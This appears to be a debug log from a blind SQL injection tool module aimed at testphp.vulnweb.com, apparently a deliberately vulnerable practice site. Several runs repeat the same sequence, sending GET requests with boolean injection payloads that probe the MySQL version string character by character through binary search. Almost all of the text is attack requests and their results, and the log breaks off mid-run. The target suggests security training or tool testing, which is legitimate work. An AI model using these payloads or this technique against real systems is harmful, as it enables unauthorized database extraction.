2015-11-30 03:39:24,262 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:39:24,263 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),1,1)).
2015-11-30 03:39:24,263 DEBUG      Cookie: None.
2015-11-30 03:39:25,281 DEBUG      Time: 1.01776885986.
2015-11-30 03:39:25,282 DEBUG      Send GET request number 18 to testphp.vulnweb.com.
2015-11-30 03:39:25,282 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=55.
2015-11-30 03:39:25,282 DEBUG      Cookie: None.
2015-11-30 03:39:26,301 DEBUG      Time: 1.01870894432.
2015-11-30 03:39:26,302 DEBUG      Send GET request number 19 to testphp.vulnweb.com.
2015-11-30 03:39:26,302 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 55<ascii(substr(version(),1,1)).
2015-11-30 03:39:26,302 DEBUG      Cookie: None.
2015-11-30 03:39:27,327 DEBUG      Time: 1.02487897873.
2015-11-30 03:39:27,328 DEBUG      Send GET request number 20 to testphp.vulnweb.com.
2015-11-30 03:39:27,328 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=51.
2015-11-30 03:39:27,328 DEBUG      Cookie: None.
2015-11-30 03:39:28,358 DEBUG      Time: 1.02962398529.
2015-11-30 03:39:28,360 DEBUG      Send GET request number 21 to testphp.vulnweb.com.
2015-11-30 03:39:28,360 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 51<ascii(substr(version(),1,1)).
2015-11-30 03:39:28,360 DEBUG      Cookie: None.
2015-11-30 03:39:29,374 DEBUG      Time: 1.01362895966.
2015-11-30 03:39:29,375 DEBUG      Send GET request number 22 to testphp.vulnweb.com.
2015-11-30 03:39:29,375 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=53.
2015-11-30 03:39:29,375 DEBUG      Cookie: None.
2015-11-30 03:39:30,407 DEBUG      Time: 1.03169298172.
2015-11-30 03:39:30,408 INFO       Found character number 1 is: 5.
2015-11-30 03:39:30,408 INFO       Character not found!
2015-11-30 03:39:30,408 INFO       Result: 5
2015-11-30 03:39:30,408 WARNING    Send 22 request.
2015-11-30 03:39:30,408 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:41:32,201 DEBUG      Set Logging mode is True.
2015-11-30 03:41:32,201 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:41:32,205 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:41:32,206 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:41:32,206 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:41:32,206 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:41:32,206 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:41:32,206 DEBUG      Found 1 inject point in URL
2015-11-30 03:41:32,206 DEBUG      Set inject point to: URL
2015-11-30 03:41:32,206 WARNING    Inject point is ready.
2015-11-30 03:41:32,207 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:41:32,207 INFO       Get MySQL version
2015-11-30 03:41:32,207 INFO       Run query: version()
2015-11-30 03:41:32,212 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:41:32,212 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:41:32,212 DEBUG      Cookie: None.
2015-11-30 03:41:33,241 DEBUG      Time: 1.02864718437.
2015-11-30 03:41:33,242 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:41:33,242 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:41:33,242 DEBUG      Cookie: None.
2015-11-30 03:41:34,289 DEBUG      Time: 1.04655790329.
2015-11-30 03:41:34,291 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:41:34,291 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:41:34,292 DEBUG      Cookie: None.
2015-11-30 03:41:35,297 DEBUG      Time: 1.00573897362.
2015-11-30 03:41:35,298 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:41:35,298 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:41:35,299 DEBUG      Cookie: None.
2015-11-30 03:41:36,300 DEBUG      Time: 1.00113797188.
2015-11-30 03:41:36,301 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:41:36,301 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:41:36,301 DEBUG      Cookie: None.
2015-11-30 03:41:37,349 DEBUG      Time: 1.04776191711.
2015-11-30 03:41:37,350 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:41:37,350 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:41:37,350 DEBUG      Cookie: None.
2015-11-30 03:41:38,387 DEBUG      Time: 1.0364420414.
2015-11-30 03:41:38,388 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:41:38,388 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:41:38,388 DEBUG      Cookie: None.
2015-11-30 03:41:39,428 DEBUG      Time: 1.0400159359.
2015-11-30 03:41:39,430 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:41:39,430 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:41:39,430 DEBUG      Cookie: None.
2015-11-30 03:41:40,462 DEBUG      Time: 1.03142690659.
2015-11-30 03:41:40,463 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:41:40,463 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:41:40,463 DEBUG      Cookie: None.
2015-11-30 03:41:41,514 DEBUG      Time: 1.05126905441.
2015-11-30 03:41:41,515 INFO       Result length: 23
2015-11-30 03:41:41,515 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:41:41,515 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=127.
2015-11-30 03:41:41,516 DEBUG      Cookie: None.
2015-11-30 03:41:42,566 DEBUG      Time: 1.05017495155.
2015-11-30 03:41:42,567 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:41:42,567 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),1,1)).
2015-11-30 03:41:42,567 DEBUG      Cookie: None.
2015-11-30 03:41:43,573 DEBUG      Time: 1.00618600845.
2015-11-30 03:41:43,574 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:41:43,574 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=63.
2015-11-30 03:41:43,575 DEBUG      Cookie: None.
2015-11-30 03:41:44,596 DEBUG      Time: 1.02171993256.
2015-11-30 03:41:44,598 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:41:44,598 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),1,1)).
2015-11-30 03:41:44,598 DEBUG      Cookie: None.
2015-11-30 03:41:45,647 DEBUG      Time: 1.0478758812.
2015-11-30 03:41:45,647 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:41:45,647 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=31.
2015-11-30 03:41:45,648 DEBUG      Cookie: None.
2015-11-30 03:41:46,694 DEBUG      Time: 1.04592514038.
2015-11-30 03:41:46,695 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:41:46,695 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),1,1)).
2015-11-30 03:41:46,695 DEBUG      Cookie: None.
2015-11-30 03:41:47,721 DEBUG      Time: 1.0261490345.
2015-11-30 03:41:47,722 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:41:47,722 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=47.
2015-11-30 03:41:47,722 DEBUG      Cookie: None.
2015-11-30 03:41:48,737 DEBUG      Time: 1.01420378685.
2015-11-30 03:41:48,737 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:41:48,738 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),1,1)).
2015-11-30 03:41:48,738 DEBUG      Cookie: None.
2015-11-30 03:41:49,757 DEBUG      Time: 1.01910495758.
2015-11-30 03:41:49,759 DEBUG      Send GET request number 18 to testphp.vulnweb.com.
2015-11-30 03:41:49,759 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=55.
2015-11-30 03:41:49,759 DEBUG      Cookie: None.
2015-11-30 03:41:50,796 DEBUG      Time: 1.03717517853.
2015-11-30 03:41:50,797 DEBUG      Send GET request number 19 to testphp.vulnweb.com.
2015-11-30 03:41:50,797 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 55<ascii(substr(version(),1,1)).
2015-11-30 03:41:50,797 DEBUG      Cookie: None.
2015-11-30 03:41:51,846 DEBUG      Time: 1.04868197441.
2015-11-30 03:41:51,847 DEBUG      Send GET request number 20 to testphp.vulnweb.com.
2015-11-30 03:41:51,847 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=51.
2015-11-30 03:41:51,847 DEBUG      Cookie: None.
2015-11-30 03:41:52,867 DEBUG      Time: 1.01912093163.
2015-11-30 03:41:52,867 DEBUG      Send GET request number 21 to testphp.vulnweb.com.
2015-11-30 03:41:52,868 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 51<ascii(substr(version(),1,1)).
2015-11-30 03:41:52,868 DEBUG      Cookie: None.
2015-11-30 03:41:53,862 DEBUG      Time: 0.993835926056.
2015-11-30 03:41:53,863 DEBUG      Send GET request number 22 to testphp.vulnweb.com.
2015-11-30 03:41:53,863 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=53.
2015-11-30 03:41:53,863 DEBUG      Cookie: None.
2015-11-30 03:41:54,864 DEBUG      Time: 1.00084996223.
2015-11-30 03:41:54,865 INFO       Found character number 1 is: 5.
2015-11-30 03:41:54,865 INFO       Character not found!
2015-11-30 03:41:54,866 INFO       Result: 5
2015-11-30 03:41:54,866 WARNING    Send 22 request.
2015-11-30 03:41:54,866 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:42:28,679 DEBUG      Set Logging mode is True.
2015-11-30 03:42:28,679 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:42:28,683 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:42:28,684 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:42:28,684 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:42:28,684 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:42:28,684 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:42:28,684 DEBUG      Found 1 inject point in URL
2015-11-30 03:42:28,685 DEBUG      Set inject point to: URL
2015-11-30 03:42:28,685 WARNING    Inject point is ready.
2015-11-30 03:42:28,685 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:42:28,685 INFO       Get MySQL version
2015-11-30 03:42:28,685 INFO       Run query: version()
2015-11-30 03:42:28,690 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:42:28,690 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:42:28,690 DEBUG      Cookie: None.
2015-11-30 03:42:29,732 DEBUG      Time: 1.04135417938.
2015-11-30 03:42:29,733 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:42:29,733 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:42:29,733 DEBUG      Cookie: None.
2015-11-30 03:42:30,757 DEBUG      Time: 1.02396798134.
2015-11-30 03:42:30,760 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:42:30,760 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:42:30,760 DEBUG      Cookie: None.
2015-11-30 03:42:31,790 DEBUG      Time: 1.02967786789.
2015-11-30 03:42:31,791 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:42:31,791 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:42:31,791 DEBUG      Cookie: None.
2015-11-30 03:42:32,800 DEBUG      Time: 1.00789999962.
2015-11-30 03:42:32,800 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:42:32,800 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:42:32,801 DEBUG      Cookie: None.
2015-11-30 03:42:33,841 DEBUG      Time: 1.04000401497.
2015-11-30 03:42:33,841 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:42:33,842 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:42:33,842 DEBUG      Cookie: None.
2015-11-30 03:42:34,892 DEBUG      Time: 1.0501408577.
2015-11-30 03:42:34,893 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:42:34,893 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:42:34,893 DEBUG      Cookie: None.
2015-11-30 03:42:35,910 DEBUG      Time: 1.01607203484.
2015-11-30 03:42:35,911 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:42:35,911 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:42:35,912 DEBUG      Cookie: None.
2015-11-30 03:42:36,958 DEBUG      Time: 1.04645204544.
2015-11-30 03:42:36,959 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:42:36,959 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:42:36,959 DEBUG      Cookie: None.
2015-11-30 03:42:38,007 DEBUG      Time: 1.04794311523.
2015-11-30 03:42:38,008 INFO       Result length: 23
2015-11-30 03:42:38,009 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:42:38,009 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=127.
2015-11-30 03:42:38,009 DEBUG      Cookie: None.
2015-11-30 03:42:39,057 DEBUG      Time: 1.04777407646.
2015-11-30 03:42:39,058 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:42:39,058 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),1,1)).
2015-11-30 03:42:39,058 DEBUG      Cookie: None.
2015-11-30 03:42:40,071 DEBUG      Time: 1.01322698593.
2015-11-30 03:42:40,072 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:42:40,072 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=63.
2015-11-30 03:42:40,072 DEBUG      Cookie: None.
2015-11-30 03:42:41,110 DEBUG      Time: 1.03761315346.
2015-11-30 03:42:41,111 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:42:41,111 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),1,1)).
2015-11-30 03:42:41,111 DEBUG      Cookie: None.
2015-11-30 03:42:42,105 DEBUG      Time: 0.993706941605.
2015-11-30 03:42:42,106 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:42:42,106 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=31.
2015-11-30 03:42:42,106 DEBUG      Cookie: None.
2015-11-30 03:42:43,155 DEBUG      Time: 1.04896783829.
2015-11-30 03:42:43,156 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:42:43,157 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),1,1)).
2015-11-30 03:42:43,157 DEBUG      Cookie: None.
2015-11-30 03:42:44,163 DEBUG      Time: 1.00596499443.
2015-11-30 03:42:44,164 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:42:44,164 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=47.
2015-11-30 03:42:44,164 DEBUG      Cookie: None.
2015-11-30 03:42:45,171 DEBUG      Time: 1.00710391998.
2015-11-30 03:42:45,172 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:42:45,172 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),1,1)).
2015-11-30 03:42:45,172 DEBUG      Cookie: None.
2015-11-30 03:42:46,184 DEBUG      Time: 1.01171207428.
2015-11-30 03:42:46,186 DEBUG      Send GET request number 18 to testphp.vulnweb.com.
2015-11-30 03:42:46,187 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=55.
2015-11-30 03:42:46,187 DEBUG      Cookie: None.
2015-11-30 03:42:47,201 DEBUG      Time: 1.01387405396.
2015-11-30 03:42:47,202 DEBUG      Send GET request number 19 to testphp.vulnweb.com.
2015-11-30 03:42:47,202 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 55<ascii(substr(version(),1,1)).
2015-11-30 03:42:47,202 DEBUG      Cookie: None.
2015-11-30 03:42:48,225 DEBUG      Time: 1.02231097221.
2015-11-30 03:42:48,225 DEBUG      Send GET request number 20 to testphp.vulnweb.com.
2015-11-30 03:42:48,226 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=51.
2015-11-30 03:42:48,226 DEBUG      Cookie: None.
2015-11-30 03:42:49,240 DEBUG      Time: 1.01368689537.
2015-11-30 03:42:49,240 DEBUG      Send GET request number 21 to testphp.vulnweb.com.
2015-11-30 03:42:49,241 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 51<ascii(substr(version(),1,1)).
2015-11-30 03:42:49,241 DEBUG      Cookie: None.
2015-11-30 03:42:50,235 DEBUG      Time: 0.993714094162.
2015-11-30 03:42:50,235 DEBUG      Send GET request number 22 to testphp.vulnweb.com.
2015-11-30 03:42:50,235 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=53.
2015-11-30 03:42:50,236 DEBUG      Cookie: None.
2015-11-30 03:42:51,267 DEBUG      Time: 1.0316388607.
2015-11-30 03:42:51,269 INFO       Found character number 1 is: 5.
2015-11-30 03:42:51,269 INFO       Character not found!
2015-11-30 03:42:51,269 INFO       Result: 5
2015-11-30 03:42:51,269 WARNING    Send 22 request.
2015-11-30 03:42:51,269 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:43:14,669 DEBUG      Set Logging mode is True.
2015-11-30 03:43:14,670 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:43:14,674 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:43:14,674 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:43:14,674 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:43:14,674 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:43:14,674 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:43:14,674 DEBUG      Found 1 inject point in URL
2015-11-30 03:43:14,674 DEBUG      Set inject point to: URL
2015-11-30 03:43:14,675 WARNING    Inject point is ready.
2015-11-30 03:43:14,675 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:43:14,675 INFO       Get MySQL version
2015-11-30 03:43:14,675 INFO       Run query: version()
2015-11-30 03:43:14,680 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:43:14,680 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:43:14,680 DEBUG      Cookie: None.
2015-11-30 03:43:15,713 DEBUG      Time: 1.03215694427.
2015-11-30 03:43:15,714 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:43:15,714 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:43:15,714 DEBUG      Cookie: None.
2015-11-30 03:43:16,736 DEBUG      Time: 1.02176117897.
2015-11-30 03:43:16,737 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:43:16,737 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:43:16,737 DEBUG      Cookie: None.
2015-11-30 03:43:17,775 DEBUG      Time: 1.03801393509.
2015-11-30 03:43:17,776 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:43:17,776 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:43:17,776 DEBUG      Cookie: None.
2015-11-30 03:43:18,825 DEBUG      Time: 1.04886317253.
2015-11-30 03:43:18,826 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:43:18,826 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:43:18,826 DEBUG      Cookie: None.
2015-11-30 03:43:19,872 DEBUG      Time: 1.04583787918.
2015-11-30 03:43:19,875 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:43:19,875 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:43:19,875 DEBUG      Cookie: None.
2015-11-30 03:43:20,903 DEBUG      Time: 1.02767515182.
2015-11-30 03:43:20,904 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:43:20,904 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:43:20,904 DEBUG      Cookie: None.
2015-11-30 03:43:21,920 DEBUG      Time: 1.01592111588.
2015-11-30 03:43:21,921 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:43:21,921 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:43:21,922 DEBUG      Cookie: None.
2015-11-30 03:43:22,973 DEBUG      Time: 1.05104613304.
2015-11-30 03:43:22,974 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:43:22,974 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:43:22,974 DEBUG      Cookie: None.
2015-11-30 03:43:23,976 DEBUG      Time: 1.00220179558.
2015-11-30 03:43:23,977 INFO       Result length: 23
2015-11-30 03:43:23,978 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:43:23,978 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=127.
2015-11-30 03:43:23,978 DEBUG      Cookie: None.
2015-11-30 03:43:25,005 DEBUG      Time: 1.02741718292.
2015-11-30 03:43:25,006 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:43:25,006 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),1,1)).
2015-11-30 03:43:25,007 DEBUG      Cookie: None.
2015-11-30 03:43:26,022 DEBUG      Time: 1.01545906067.
2015-11-30 03:43:26,023 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:43:26,023 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=63.
2015-11-30 03:43:26,023 DEBUG      Cookie: None.
2015-11-30 03:43:27,071 DEBUG      Time: 1.04744696617.
2015-11-30 03:43:27,072 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:43:27,072 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),1,1)).
2015-11-30 03:43:27,072 DEBUG      Cookie: None.
2015-11-30 03:43:28,098 DEBUG      Time: 1.0254919529.
2015-11-30 03:43:28,099 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:43:28,099 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=31.
2015-11-30 03:43:28,099 DEBUG      Cookie: None.
2015-11-30 03:43:29,116 DEBUG      Time: 1.01717305183.
2015-11-30 03:43:29,117 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:43:29,117 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),1,1)).
2015-11-30 03:43:29,117 DEBUG      Cookie: None.
2015-11-30 03:43:30,125 DEBUG      Time: 1.00718808174.
2015-11-30 03:43:30,126 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:43:30,127 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=47.
2015-11-30 03:43:30,127 DEBUG      Cookie: None.
2015-11-30 03:43:31,146 DEBUG      Time: 1.019135952.
2015-11-30 03:43:31,147 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:43:31,147 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),1,1)).
2015-11-30 03:43:31,147 DEBUG      Cookie: None.
2015-11-30 03:43:32,188 DEBUG      Time: 1.04076886177.
2015-11-30 03:43:32,189 DEBUG      Send GET request number 18 to testphp.vulnweb.com.
2015-11-30 03:43:32,189 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=55.
2015-11-30 03:43:32,189 DEBUG      Cookie: None.
2015-11-30 03:43:33,208 DEBUG      Time: 1.01852893829.
2015-11-30 03:43:33,209 DEBUG      Send GET request number 19 to testphp.vulnweb.com.
2015-11-30 03:43:33,209 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 55<ascii(substr(version(),1,1)).
2015-11-30 03:43:33,209 DEBUG      Cookie: None.
2015-11-30 03:43:34,215 DEBUG      Time: 1.00575304031.
2015-11-30 03:43:34,216 DEBUG      Send GET request number 20 to testphp.vulnweb.com.
2015-11-30 03:43:34,216 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=51.
2015-11-30 03:43:34,216 DEBUG      Cookie: None.
2015-11-30 03:43:35,268 DEBUG      Time: 1.05223989487.
2015-11-30 03:43:35,270 DEBUG      Send GET request number 21 to testphp.vulnweb.com.
2015-11-30 03:43:35,270 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 51<ascii(substr(version(),1,1)).
2015-11-30 03:43:35,270 DEBUG      Cookie: None.
2015-11-30 03:43:36,319 DEBUG      Time: 1.04855394363.
2015-11-30 03:43:36,320 DEBUG      Send GET request number 22 to testphp.vulnweb.com.
2015-11-30 03:43:36,320 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=53.
2015-11-30 03:43:36,320 DEBUG      Cookie: None.
2015-11-30 03:43:37,347 DEBUG      Time: 1.02645683289.
2015-11-30 03:43:37,347 INFO       Found character number 1 is: 5.
2015-11-30 03:43:37,347 INFO       Character not found!
2015-11-30 03:43:37,348 DEBUG      Send GET request number 23 to testphp.vulnweb.com.
2015-11-30 03:43:37,348 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=127.
2015-11-30 03:43:37,348 DEBUG      Cookie: None.
2015-11-30 03:43:38,389 DEBUG      Time: 1.04105210304.
2015-11-30 03:43:38,390 DEBUG      Send GET request number 24 to testphp.vulnweb.com.
2015-11-30 03:43:38,390 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),2,1)).
2015-11-30 03:43:38,390 DEBUG      Cookie: None.
2015-11-30 03:43:39,437 DEBUG      Time: 1.04653906822.
2015-11-30 03:43:39,438 DEBUG      Send GET request number 25 to testphp.vulnweb.com.
2015-11-30 03:43:39,438 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=63.
2015-11-30 03:43:39,438 DEBUG      Cookie: None.
2015-11-30 03:43:40,488 DEBUG      Time: 1.04969906807.
2015-11-30 03:43:40,490 DEBUG      Send GET request number 26 to testphp.vulnweb.com.
